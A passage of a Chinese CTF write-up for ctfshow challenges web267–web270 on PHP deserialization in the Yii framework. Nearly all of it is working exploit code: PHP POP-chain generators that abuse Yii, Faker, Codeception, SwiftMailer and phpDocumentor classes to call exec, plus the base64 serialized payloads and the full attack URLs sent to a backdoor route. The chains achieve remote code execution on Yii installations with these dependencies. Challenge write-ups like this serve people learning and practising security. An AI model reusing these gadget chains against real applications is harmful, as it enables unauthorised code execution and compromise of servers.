<p>backdoor/shell是路由，与url拼接，这里不是直接?xxx，而是直接在最后&amp;view-source，why？看看yii路由是什么样的，传送门。这题考察的其实是yii框架的反序列化。<br> 随便找个POC用一下，不过这题system不行，而且好像没回显？但是我用passthru可以有回显：、</p>
<p>过滤了flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">   TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NDoiZXhlYyI7czoyOiJpZCI7czoxNDoiY3AgL2ZsYSogMS50eHQiO31pOjE7czozOiJydW4iO319fX0=</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>：</span><br><span class="line"></span><br><span class="line"><span class="attribute">index</span>.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN<span class="number">1</span>bHQiOjE<span class="number">6</span>e<span class="number">3</span>M<span class="number">6</span>MzY<span class="number">6</span>IgB<span class="number">5</span>aWlcZGJcQmF<span class="number">0</span>Y<span class="number">2</span>hRdWVyeVJlc<span class="number">3</span>VsdABfZGF<span class="number">0</span>YVJlYWRlciI<span class="number">7</span>TzoxNToiRmFrZXJcR<span class="number">2</span>VuZXJhdG<span class="number">9</span>yIjoxOntzOjEzOiIAKgBmb<span class="number">3</span>JtYXR<span class="number">0</span>ZXJzIjthOjE<span class="number">6</span>e<span class="number">3</span>M<span class="number">6</span>NToiY<span class="number">2</span>xvc<span class="number">2</span>UiO<span class="number">2</span>E<span class="number">6</span>Mjp<span class="number">7</span>aTowO<span class="number">086</span>MjE<span class="number">6</span>InlpaVxyZXN<span class="number">0</span>XENyZWF<span class="number">0</span>ZUFjdGlvbiI<span class="number">6</span>Mjp<span class="number">7</span>czoxMToiY<span class="number">2</span>hlY<span class="number">2</span>tBY<span class="number">2</span>Nlc<span class="number">3</span>MiO<span class="number">3</span>M<span class="number">6</span>NDoiZXhlYyI<span class="number">7</span>czoyOiJpZCI<span class="number">7</span>czoxNDoiY<span class="number">3</span>AgL<span class="number">2</span>ZsYSogMS<span class="number">50</span>eHQiO<span class="number">31</span>pOjE<span class="number">7</span>czozOiJydW<span class="number">4</span>iO<span class="number">319</span>fX<span class="number">0</span>=</span><br></pre></td></tr></table></figure>

<p>之后访问1.txt即可</p>
<h3 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h3><p>与上题步骤相同：</p>
<p>但是上一道题payload不能用了</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">url:</span><br><span class="line">index.php?r=backdoor/shell&amp;code=TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjk6ImlzUnVubmluZyI7YToyOntpOjA7TzoyMDoieWlpXHJlc3RcSW5kZXhBY3Rpb24iOjI6e3M6MTE6ImNoZWNrQWNjZXNzIjtzOjQ6ImV4ZWMiO3M6MjoiaWQiO3M6MTQ6ImNwIC9mbGEqIDEudHh0Ijt9aToxO3M6MzoicnVuIjt9fX19fQ==</span><br></pre></td></tr></table></figure>

<h3 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> IndexAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description=<span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path=<span class="keyword">new</span> See();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys=<span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;hello&#x27;</span>=&gt;<span class="string">&#x27;world&#x27;</span></span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>:</span><br><span class="line"><span class="attribute">index</span>.php?r=backdoor/shell&amp;code=TzoyNzoiU<span class="number">3</span>dpZnRfS<span class="number">2</span>V<span class="number">5</span>Q<span class="number">2</span>FjaGVfRGlza<span class="number">0</span>tleUNhY<span class="number">2</span>hlIjoyOntzOjMzOiIAU<span class="number">3</span>dpZnRfS<span class="number">2</span>V<span class="number">5</span>Q<span class="number">2</span>FjaGVfRGlza<span class="number">0</span>tleUNhY<span class="number">2</span>hlAGtleXMiO<span class="number">2</span>E<span class="number">6</span>MTp<span class="number">7</span>czo<span class="number">1</span>OiJoZWxsbyI<span class="number">7</span>czo<span class="number">1</span>OiJ<span class="number">3</span>b<span class="number">3</span>JsZCI<span class="number">7</span>fXM<span class="number">6</span>MzM<span class="number">6</span>IgBTd<span class="number">2</span>lmdF<span class="number">9</span>LZXlDYWNoZV<span class="number">9</span>EaXNrS<span class="number">2</span>V<span class="number">5</span>Q<span class="number">2</span>FjaGUAcGF<span class="number">0</span>aCI<span class="number">7</span>Tzo<span class="number">0</span>MjoicGhwRG<span class="number">9</span>jdW<span class="number">1</span>lbnRvclxSZWZsZWN<span class="number">0</span>aW<span class="number">9</span>uXERvY<span class="number">0</span>Jsb<span class="number">2</span>NrXFRhZ<span class="number">3</span>NcU<span class="number">2</span>VlIjoxOntzOjE<span class="number">0</span>OiIAKgBkZXNjcmlwdGlvbiI<span class="number">7</span>TzoxNToiRmFrZXJcR<span class="number">2</span>VuZXJhdG<span class="number">9</span>yIjoxOntzOjEzOiIAKgBmb<span class="number">3</span>JtYXR<span class="number">0</span>ZXJzIjthOjE<span class="number">6</span>e<span class="number">3</span>M<span class="number">6</span>NjoicmVuZGVyIjthOjI<span class="number">6</span>e<span class="number">2</span>k<span class="number">6</span>MDtPOjIwOiJ<span class="number">5</span>aWlccmVzdFxJbmRleEFjdGlvbiI<span class="number">6</span>Mjp<span class="number">7</span>czoxMToiY<span class="number">2</span>hlY<span class="number">2</span>tBY<span class="number">2</span>Nlc<span class="number">3</span>MiO<span class="number">3</span>M<span class="number">6</span>NDoiZXhlYyI<span class="number">7</span>czoyOiJpZCI<span class="number">7</span>czoxNToiY<span class="number">3</span>AgL<span class="number">2</span>ZsYSogMS<span class="number">50</span>eHQgIjt<span class="number">9</span>aToxO<span class="number">3</span>M<span class="number">6</span>MzoicnVuIjt<span class="number">9</span>fX<span class="number">19</span>fQ==</span><br></pre></td></tr></table></figure>

<h3 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">IndexAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* 1.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">web</span>\<span class="title">DbSession</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader=<span class="keyword">new</span> DbSession();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">web</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">IndexAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DbSession</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$writeCallback</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable">$a</span>=<span class="keyword">new</span> IndexAction();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;writeCallback=[<span class="variable">$a</span>,<span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> BatchQueryResult()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">url</span>:</span><br><span class="line"><span class="attribute">index</span>.php?r=backdoor/shell&amp;code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN<span class="number">1</span>bHQiOjE<span class="number">6</span>e<span class="number">3</span>M<span class="number">6</span>MzY<span class="number">6</span>IgB<span class="number">5</span>aWlcZGJcQmF<span class="number">0</span>Y<span class="number">2</span>hRdWVyeVJlc<span class="number">3</span>VsdABfZGF<span class="number">0</span>YVJlYWRlciI<span class="number">7</span>TzoxNzoieWlpXHdlYlxEYlNlc<span class="number">3</span>Npb<span class="number">24</span>iOjE<span class="number">6</span>e<span class="number">3</span>M<span class="number">6</span>MTM<span class="number">6</span>IndyaXRlQ<span class="number">2</span>FsbGJhY<span class="number">2</span>siO<span class="number">2</span>E<span class="number">6</span>Mjp<span class="number">7</span>aTowO<span class="number">086</span>MjA<span class="number">6</span>InlpaVxyZXN<span class="number">0</span>XEluZGV<span class="number">4</span>QWN<span class="number">0</span>aW<span class="number">9</span>uIjoyOntzOjExOiJjaGVja<span class="number">0</span>FjY<span class="number">2</span>VzcyI<span class="number">7</span>czo<span class="number">0</span>OiJleGVjIjtzOjI<span class="number">6</span>ImlkIjtzOjE<span class="number">0</span>OiJjcCAvZmxhKiAxLnR<span class="number">4</span>dCI<span class="number">7</span>fWk<span class="number">6</span>MTtzOjM<span class="number">6</span>InJ<span class="number">1</span>biI<span class="number">7</span>fX<span class="number">19</span></span><br></pre></td></tr></table></figure>



